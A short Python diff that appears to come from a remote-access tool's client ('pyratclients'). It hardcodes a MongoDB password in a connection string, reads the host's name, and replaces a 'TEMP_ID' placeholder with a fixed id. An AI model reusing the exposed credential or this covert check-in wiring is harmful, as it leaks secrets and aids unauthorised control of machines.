@@ -13,7 +13,7 @@ import subprocess
 password = "SB5aaHgp2IYtT72e"
 connection_string = f"mongodb+srv://client:{password}@pyratclients.yq8xdfc.mongodb.net/?retryWrites=true&w=majority"
 
-temp_id = "TEMP_ID"
+temp_id = "kgmeiittai"
 pcname = socket.gethostname()
 
 client = MongoClient(connection_string)
